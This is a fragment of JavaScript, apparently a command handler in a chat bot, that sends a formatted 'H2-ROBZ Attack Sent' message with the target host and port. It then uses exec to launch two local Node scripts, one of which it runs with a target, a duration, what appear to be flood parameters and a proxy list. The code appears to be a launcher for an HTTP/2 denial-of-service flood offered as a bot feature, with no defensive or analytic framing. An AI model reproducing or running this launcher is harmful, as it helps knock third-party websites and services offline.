...
╭━✧「 <b>H2-ROBZ Attack Sent Succes</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
    ...
    const kontol = path.join(__dirname, `../lib/cache/h2-robz`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${kontol} ${target} ${duration} 64 16 proxy.txt`);
  },
};